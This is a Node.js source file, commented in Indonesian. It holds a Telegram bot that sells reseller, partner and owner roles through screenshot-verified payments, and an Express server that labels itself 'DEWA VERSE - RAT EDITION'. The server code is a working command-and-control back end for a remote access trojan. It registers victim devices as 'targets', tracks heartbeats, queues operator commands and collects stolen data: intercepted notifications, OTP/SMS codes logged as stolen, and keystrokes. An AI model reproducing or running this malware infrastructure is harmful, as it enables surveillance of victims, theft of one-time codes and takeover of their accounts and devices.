function addRoleById(chatId, targetId, roleType) {
  const config = loadTelegramConfig();
  const roleMap = {
    res: { list: "resList", label: "RES (Reseller)" },
    pt: { list: "ptList", label: "PT (Partner)" },
    owner: { list: "ownerList", label: "OWNER" },
    tk: { list: "tkList", label: "TK" }
  };

  const role = roleMap[roleType];
  if (!role) {
    return bot.sendMessage(chatId, `<blockquote>❌ Role tidak dikenal.</blockquote>`, { parse_mode: "HTML" });
  }

  const userExists = (list) => list && list.includes(targetId);
  if (userExists(config[role.list])) {
    return bot.sendMessage(chatId, `<blockquote>❌ User sudah memiliki role ${role.label}.</blockquote>`, { parse_mode: "HTML" });
  }

  if (!config[role.list]) config[role.list] = [];
  config[role.list].push(targetId);
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));

  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: ${role.label}</blockquote>`, { parse_mode: "HTML" });
}

// Fungsi helper untuk create account
function createAccountByRole(chatId, roleName) {
  bot.sendMessage(chatId, `<blockquote>Masukkan data untuk akun ${roleName.toUpperCase()}:\n\nFormat: username|password|durasi_hari\n\nContoh: senyap|123|9999</blockquote>`, { parse_mode: "HTML" });
  
  bot.once("message", msg => {
    const text = msg.text || "";
    const parts = text.split("|").map(s => s.trim());
    
    if (parts.length !== 3) {
      return bot.sendMessage(chatId, `<blockquote>❌ Format salah!\nGunakan: username|password|durasi_hari\n\nContoh: senyap|123|9999</blockquote>`, { parse_mode: "HTML" });
    }
    
    const [username, password, day] = parts;
    const db = loadDatabase();
    
    if (db.find(u => u.username === username)) {
      return bot.sendMessage(chatId, `<blockquote>❌ Username sudah ada!</blockquote>`, { parse_mode: "HTML" });
    }
    
    const expired = new Date();
    expired.setDate(expired.getDate() + parseInt(day));
    db.push({ username, password, role: roleName, expiredDate: expired.toISOString().split("T")[0] });
    saveDatabase(db);
    
    bot.sendMessage(chatId, `<blockquote>✅ Akun ${roleName.toUpperCase()} dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}\n📅 Expired: ${expired.toISOString().split("T")[0]}</blockquote>`, { parse_mode: "HTML" });
    console.log(`[TELEGRAM] Akun ${roleName} dibuat: ${username} | ${password} | ${expired.toISOString().split("T")[0]}`);
  });
}

// ===== FUNGSI STORAN =====

function handleStoranUsername(chatId, userId, text) {
  try {
    const storanData = loadStoranData();
    const pending = storanData.pending.find(s => s.userId === userId && s.step === "waiting_username");
    if (!pending) {
      return bot.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif. Mulai dari /start</blockquote>`, { parse_mode: "HTML" });
    }
    
    const targetId = text.trim();
    pending.username = targetId;
    pending.step = "waiting_ss";
    saveStoranData(storanData);
    bot.sendMessage(chatId, `<blockquote>📸 Kirimkan Screenshot Bukti Trx Buyer (TRX):</blockquote>`, { parse_mode: "HTML" });
  } catch (error) {
    console.error('[ERROR] handleStoranUsername:', error.message);
    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan. Silakan coba lagi.</blockquote>`, { parse_mode: "HTML" });
  }
}

function handleStoranSS(chatId, userId, photoId) {
  const storanData = loadStoranData();
  const pending = storanData.pending.find(s => s.userId === userId && s.step === "waiting_ss");
  if (!pending) {
    return bot.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif.</blockquote>`, { parse_mode: "HTML" });
  }
  pending.ssImage = photoId;
  pending.step = "waiting_approve";
  saveStoranData(storanData);
  sendStoranToApprover(chatId, pending);
  bot.sendMessage(chatId, `<blockquote>✅ Bukti TRX terkirim! Menunggu persetujuan Admin...</blockquote>`, { parse_mode: "HTML" });
}

function sendStoranToApprover(userChatId, pending) {
  const config = loadTelegramConfig();
  const approvers = [...(config.ownerList || []), ...(config.tkList || [])];
  if (approvers.length === 0) {
    return bot.sendMessage(userChatId, `<blockquote>❌ Tidak ada Admin yang tersedia.</blockquote>`, { parse_mode: "HTML" });
  }
  const caption = `<blockquote>📦 STORAN BARU\n\n🆔 ID: ${pending.id}\n👤 User: ${userChatId}\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n⏳ Menunggu persetujuan...</blockquote>`;
  for (const approverId of approvers) {
    bot.sendPhoto(approverId, pending.ssImage, {
      caption: caption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "✅ Terima", callback_data: `storan_terima_${pending.id}` },
          { text: "❌ Tolak", callback_data: `storan_tolak_${pending.id}` }
        ]]
      }
    });
  }
}

async function handleStoranApprove(approverId, storanId, action, query) {
  console.log('[STORAN] Approve dipanggil:', { approverId, storanId, action });
  
  try {
    const storanData = loadStoranData();
    const index = storanData.pending.findIndex(s => s.id === storanId);
    
    console.log('[STORAN] Index ditemukan:', index);
    
    if (index === -1) {
      bot.answerCallbackQuery(query.id, { text: "Data tidak ditemukan." });
      return bot.sendMessage(approverId, `<blockquote>❌ Data storan tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
    }
    
    const pending = storanData.pending[index];
    const userId = pending.userId;
    
    console.log('[STORAN] Pending data:', { userId, package: pending.packageName, username: pending.username });
    
    if (action === "tolak") {
      try {
        bot.sendMessage(userId, `<blockquote>❌ Bukti Trx DITOLAK!\n\nSilakan kirim ulang Bukti Trx yang benar.</blockquote>`, { parse_mode: "HTML" });
      } catch (err) {
        console.log('[ERROR] Gagal kirim ke user:', err.message);
        bot.sendMessage(approverId, `<blockquote>⚠️ Gagal kirim notifikasi ke user ${userId}.\n\nPastikan user sudah chat dengan bot.</blockquote>`, { parse_mode: "HTML" });
      }
      
      storanData.pending.splice(index, 1);
      saveStoranData(storanData);
      bot.answerCallbackQuery(query.id, { text: "✅ Storan ditolak." });
      return bot.sendMessage(approverId, `<blockquote>✅ Storan ${storanId} telah DITOLAK.</blockquote>`, { parse_mode: "HTML" });
    }
    
    // ===== ACTION = TERIMA =====
    const qrCodeUrl = QR_CODE_PAYMENT;
    pending.step = "waiting_qr_ss";
    saveStoranData(storanData);
    
    // Kirim QR ke user
    try {
      await bot.sendPhoto(userId, qrCodeUrl, {
        caption: `<blockquote>✅ Bukti Transfer DITERIMA!\n\n📱 Scan QR Code di atas untuk transfer:\n\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n💰 Transfer 50% dari harga role paket.\n\n📌 Setelah transfer, kirim Bukti TF nya.</blockquote>`,
        parse_mode: "HTML"
      });
      
      bot.answerCallbackQuery(query.id, { text: "✅ Storan diterima, QR dikirim." });
      bot.sendMessage(approverId, `<blockquote>✅ Storan ${storanId} DITERIMA.\nQR Code telah dikirim ke user.</blockquote>`, { parse_mode: "HTML" });
    } catch (err) {
      console.log('[ERROR] Gagal kirim QR:', err.message);
      bot.sendMessage(approverId, `<blockquote>⚠️ Gagal kirim QR ke user ${userId}.\n\nPastikan user sudah chat dengan bot.\n\nError: ${err.message}</blockquote>`, { parse_mode: "HTML" });
      storanData.pending.splice(index, 1);
      saveStoranData(storanData);
      bot.answerCallbackQuery(query.id, { text: "Gagal kirim QR." });
    }
    
  } catch (error) {
    console.log('[ERROR] handleStoranApprove:', error.message);
    console.log('[ERROR] Stack:', error.stack);
    bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan." });
    bot.sendMessage(approverId, `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`, { parse_mode: "HTML" });
  }
}

function handleStoranQrSS(chatId, userId, photoId) {
  const storanData = loadStoranData();
  const pending = storanData.pending.find(s => s.userId === userId && s.step === "waiting_qr_ss");
  if (!pending) {
    return bot.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif.</blockquote>`, { parse_mode: "HTML" });
  }
  pending.ssQrImage = photoId;
  pending.step = "waiting_qr_approve";
  saveStoranData(storanData);
  
  const config = loadTelegramConfig();
  const approvers = [...(config.ownerList || []), ...(config.tkList || [])];
  const caption = `<blockquote>📦 STORAN - Bukti TF\n\n🆔 ID: ${pending.id}\n👤 User: ${userId}\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n⏳ Menunggu persetujuan final...</blockquote>`;
  
  for (const approverId of approvers) {
    bot.sendPhoto(approverId, pending.ssQrImage, {
      caption: caption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "✅ Terima", callback_data: `storan_qr_terima_${pending.id}` },
          { text: "❌ Tolak", callback_data: `storan_qr_tolak_${pending.id}` }
        ]]
      }
    });
  }
  bot.sendMessage(chatId, `<blockquote>✅ Bukti TF terkirim! Menunggu persetujuan final...</blockquote>`, { parse_mode: "HTML" });
}

async function handleStoranQrApprove(approverId, storanId, action, query) {
  try {
    const storanData = loadStoranData();
    const index = storanData.pending.findIndex(s => s.id === storanId);
    
    if (index === -1) {
      bot.answerCallbackQuery(query.id, { text: "Data tidak ditemukan." });
      return bot.sendMessage(approverId, `<blockquote>❌ Data storan tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
    }
    
    const pending = storanData.pending[index];
    const userId = pending.userId;
    const targetId = pending.username; // Ini sekarang berisi ID
    const packageKey = pending.package;
    
    console.log('[STORAN QR] Approve:', { approverId, storanId, action, targetId, packageKey });
    
    if (action === "tolak") {
      try {
        bot.sendMessage(userId, `<blockquote>❌ Bukti TF DITOLAK!\n\nSilakan kirim ulang Bukti TF yang benar.</blockquote>`, { parse_mode: "HTML" });
      } catch (err) {
        console.log('[ERROR] Gagal kirim ke user:', err.message);
        bot.sendMessage(approverId, `<blockquote>⚠️ Gagal kirim notifikasi ke user ${userId}.</blockquote>`, { parse_mode: "HTML" });
      }
      
      pending.step = "waiting_qr_ss";
      pending.ssQrImage = null;
      saveStoranData(storanData);
      bot.answerCallbackQuery(query.id, { text: "✅ Bukti TF ditolak" });
      return bot.sendMessage(approverId, `<blockquote>✅ Bukti TF ${storanId} telah DITOLAK.</blockquote>`, { parse_mode: "HTML" });
    }
    
    // ===== ACTION = TERIMA =====
    const targetTelegramId = parseInt(targetId);
    
    if (isNaN(targetTelegramId)) {
      bot.sendMessage(approverId, `<blockquote>❌ ID '${targetId}' tidak valid!</blockquote>`, { parse_mode: "HTML" });
      storanData.pending.splice(index, 1);
      saveStoranData(storanData);
      return;
    }
    
    console.log('[STORAN QR] Target ID:', targetTelegramId);
    
    // ===== CEK PAKET MEMBER =====
    if (packageKey === "member") {
      const groupLink = config.GROUP_LINK;
      
      const config = loadTelegramConfig();
      if (!config.userList) config.userList = [];
      if (!config.userList.includes(targetTelegramId)) {
        config.userList.push(targetTelegramId);
        fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
      }
      
      try {
        bot.sendMessage(userId, `<blockquote>✅ STORAN MEMBER SUKSES!\n\n🆔 ID: ${targetTelegramId}\n📦 Paket: MEMBER\n\n🔗 Link Grup Member:\n${groupLink}</blockquote>`, { parse_mode: "HTML" });
      } catch (err) {
        console.log('[ERROR] Gagal kirim ke user:', err.message);
      }
      
      bot.sendMessage(approverId, `<blockquote>✅ STORAN MEMBER SELESAI!\n\n🆔 ${targetTelegramId}\n📦 MEMBER</blockquote>`, { parse_mode: "HTML" });
      
      storanData.pending.splice(index, 1);
      saveStoranData(storanData);
      bot.answerCallbackQuery(query.id, { text: "✅ Storan Member selesai!" });
      return;
    }
    
    // ===== PAKET RES/PT/OWNER/TK =====
    const roleMap = {
      res: "resList",
      pt: "ptList",
      owner: "ownerList",
      tk: "tkList"
    };
    
    const roleListKey = roleMap[packageKey];
    if (!roleListKey) {
      bot.sendMessage(approverId, `<blockquote>❌ Paket tidak dikenal!</blockquote>`, { parse_mode: "HTML" });
      storanData.pending.splice(index, 1);
      saveStoranData(storanData);
      return;
    }
    
    const config = loadTelegramConfig();
    
    const currentList = config[roleListKey] || [];
    if (currentList.includes(targetTelegramId)) {
      try {
        bot.sendMessage(userId, `<blockquote>❌ ID ${targetTelegramId} sudah memiliki role ${pending.packageName}!</blockquote>`, { parse_mode: "HTML" });
      } catch (err) {
        console.log('[ERROR] Gagal kirim ke user:', err.message);
      }
      bot.sendMessage(approverId, `<blockquote>❌ ID ${targetTelegramId} sudah memiliki role ${pending.packageName}!</blockquote>`, { parse_mode: "HTML" });
      storanData.pending.splice(index, 1);
      saveStoranData(storanData);
      return;
    }
    
    // TAMBAH ROLE
    config[roleListKey].push(targetTelegramId);
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    
    const roleLabel = {
      res: "RES (Reseller)",
      pt: "PT (Partner)",
      owner: "OWNER",
      tk: "TK"
    };
    
    try {
      bot.sendMessage(userId, `<blockquote>✅ STORAN SUKSES!\n\n🆔 ID: ${targetTelegramId}\n📦 Paket: ${pending.packageName}\n🎯 Role: ${roleLabel[packageKey] || packageKey.toUpperCase()}</blockquote>`, { parse_mode: "HTML" });
    } catch (err) {
      console.log('[ERROR] Gagal kirim ke user:', err.message);
    }
    
    bot.sendMessage(approverId, `<blockquote>✅ STORAN SELESAI!\n\n🆔 ${targetTelegramId}\n📦 ${pending.packageName}</blockquote>`, { parse_mode: "HTML" });
    
    storanData.pending.splice(index, 1);
    saveStoranData(storanData);
    bot.answerCallbackQuery(query.id, { text: "✅ Storan selesai!" });
    
  } catch (error) {
    console.log('[ERROR] handleStoranQrApprove:', error.message);
    bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan." });
    bot.sendMessage(approverId, `<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`, { parse_mode: "HTML" });
  }
}

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

const GROUP_CHAT_ID = config.GROUP_CHAT_ID;

setTimeout(() => {
    const targetChatId = GROUP_CHAT_ID; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ===== COMMAND ROLE =====

// /addres - Tambah role RES
bot.onText(/^\/addres\s+(\d+)/, (msg, match) => {
  const chatId = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(chatId);

  if (!isOwner) {
    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED</blockquote>`, { parse_mode: "HTML" });
  }

  const targetId = parseInt(match[1]);
  if (config.resList && config.resList.includes(targetId)) {
    return bot.sendMessage(chatId, `<blockquote>❌ User already has RES role.</blockquote>`, { parse_mode: "HTML" });
  }

  if (!config.resList) config.resList = [];
  config.resList.push(targetId);
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));

  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: RES (Reseller)</blockquote>`, { parse_mode: "HTML" });
});

// /addpt - Tambah role PT
bot.onText(/^\/addpt\s+(\d+)/, (msg, match) => {
  const chatId = msg.from.id;
  const config = loadTelegramConfig();
  const isRes = config.resList && config.resList.includes(chatId);
  const isOwner = config.ownerList.includes(chatId);

  if (!isRes && !isOwner) {
    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED</blockquote>`, { parse_mode: "HTML" });
  }

  const targetId = parseInt(match[1]);
  if (config.ptList && config.ptList.includes(targetId)) {
    return bot.sendMessage(chatId, `<blockquote>❌ User already has PT role.</blockquote>`, { parse_mode: "HTML" });
  }

  if (!config.ptList) config.ptList = [];
  config.ptList.push(targetId);
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));

  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: PT (Partner)</blockquote>`, { parse_mode: "HTML" });
});

bot.onText(/^\/addowner\s+(\d+)/, (msg, match) => {
  const chatId = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList && config.ownerList.includes(chatId);
  const isTk = config.tkList && config.tkList.includes(chatId);

  if (!isOwner && !isTk) {
    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED\n\nHanya OWNER atau TK yang bisa menambah OWNER.</blockquote>`, { parse_mode: "HTML" });
  }

  const targetId = parseInt(match[1]);
  if (config.ownerList && config.ownerList.includes(targetId)) {
    return bot.sendMessage(chatId, `<blockquote>❌ User already has OWNER role.</blockquote>`, { parse_mode: "HTML" });
  }

  if (!config.ownerList) config.ownerList = [];
  config.ownerList.push(targetId);
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));

  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: OWNER</blockquote>`, { parse_mode: "HTML" });
});

// /addtk - Tambah role TK
bot.onText(/^\/addtk\s+(\d+)/, (msg, match) => {
  const chatId = msg.from.id;
  const config = loadTelegramConfig();
  const isTk = config.tkList && config.tkList.includes(chatId);

  if (!isTk) {
    return bot.sendMessage(chatId, `<blockquote>❌ ACCESS DENIED\n\nHanya TK yang bisa menambah TK.</blockquote>`, { parse_mode: "HTML" });
  }

  const targetId = parseInt(match[1]);
  if (config.tkList && config.tkList.includes(targetId)) {
    return bot.sendMessage(chatId, `<blockquote>❌ User already has TK role.</blockquote>`, { parse_mode: "HTML" });
  }

  if (!config.tkList) config.tkList = [];
  config.tkList.push(targetId);
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));

  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: TK</blockquote>`, { parse_mode: "HTML" });
});

// ===== CEK ROLE =====
bot.onText(/^\/info$/, (msg) => {
  const chatId = msg.from.id;
  const config = loadTelegramConfig();

  let role = "User";
  if (config.tkList && config.tkList.includes(chatId)) role = "TK";
  else if (config.ownerList && config.ownerList.includes(chatId)) role = "Owner";
  else if (config.ptList && config.ptList.includes(chatId)) role = "PT";
  else if (config.resList && config.resList.includes(chatId)) role = "RES";
  else if (config.userList && config.userList.includes(chatId)) role = "User";

  const userInfo = `<blockquote>👤 Informasi User\n\n📌 Nama: ${msg.from.first_name || '-'}\n🆔 ID: ${chatId}\n🎯 Role: ${role}</blockquote>`;

  bot.sendMessage(chatId, userInfo, { parse_mode: "HTML" });
});

// ========== TAMBAHKAN INI DI ATAS APP.LISTEN ==========
app.use(cors()); 
app.use(bodyParser.json({ limit: '500mb' })); 

const TARGETS_FILE = './targets.json';
const NOTIF_FILE = './notifications.json';
const COMMANDS_FILE = './commands.json';
const RESPONSES_FILE = './responses.json';

const readData = (file) => {
    if (!fs.existsSync(file)) return [];
    try {
        const content = fs.readFileSync(file, 'utf8');
        return JSON.parse(content || '[]');
    } catch (e) { return []; }
};

const saveData = (file, data) => {
    try {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (e) { console.log(`[!] Gagal simpan database: ${file}`, e); }
};

// ENDPOINT HEARTBEAT
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === targetId);

    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].status = "Online";
        saveData(TARGETS_FILE, targets);
    }
    
    res.status(200).send('1'); 
});

app.post('/api/register-target', (req, res) => {
    const deviceData = req.body;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === deviceData.id);

    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date() });
    }
    saveData(TARGETS_FILE, targets);
    res.json({ status: 'ok' });
});

app.get('/api/list-targets', (req, res) => {
    const targets = readData(TARGETS_FILE);
    res.json(targets);
});

app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    let allNotifs = readData(NOTIF_FILE);
    
    if(req.body.category === "OTP/SMS") {
        console.log(`[intercept] SMS CURIAN: ${req.body.title} -> ${req.body.body}`);
    }

    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
    if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
    saveData(NOTIF_FILE, allNotifs);
    console.log(`[NOTIF] Data masuk dari Target: ${targetId}`);
    res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
    const allNotifs = readData(NOTIF_FILE);
    const filtered = allNotifs.filter(n => n.targetId === req.params.id);
    res.json(filtered);
});

app.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    let commands = readData(COMMANDS_FILE);
    
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    
    saveData(COMMANDS_FILE, commands);
    console.log(`[CMD] Operator -> ${id}: ${command}`);
    res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
    const targetId = req.params.id;
    let commands = readData(COMMANDS_FILE);
    const cmdIndex = commands.findIndex(c => c.targetId === targetId);

    if (cmdIndex !== -1) {
        const cmd = commands[cmdIndex];
        commands.splice(cmdIndex, 1); 
        saveData(COMMANDS_FILE, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const { cmd, data } = req.body;
    let responses = readData(RESPONSES_FILE);

    if(cmd === "lock_key_attempt" || cmd === "lock_input_log") {
        console.log(`[KEYLOG] Target ${targetId} mengetik: ${data.input || data.attempt}`);
    }

    const index = responses.findIndex(r => r.targetId === targetId);
    const newRes = { targetId, cmd, data, timestamp: new Date() };

    if (index !== -1) responses[index] = newRes;
    else responses.push(newRes);
    
    saveData(RESPONSES_FILE, responses);
    console.log(`[!] Respon ${cmd} diterima dari ${targetId}`);
    res.json({ status: 'received' });
});

app.get('/api/get-response/:id', (req, res) => {
    const responses = readData(RESPONSES_FILE);
    const resData = responses.find(r => r.targetId === req.params.id);
    res.json(resData || {});
});

app.post('/api/login', (req, res) => {
    console.log(`[LOGIN] Bypass attempt for user: ${req.body.username}`);
    res.json({ status: 'ok', message: 'Bypassed by Dark-Ai' });
});

console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
console.log(`    DEWA VERSE - RAT EDITION   `);
console.log(`    STATUS : PERSISTENCE ACTIVE        `);
console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

// ===== START SERVER (HANYA SATU APP.LISTEN) =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di Server running on http://${domain}:${PORT}`);
  startVipSessions();
  startUserSessions();

  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, THIRTY_MINUTES);
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
});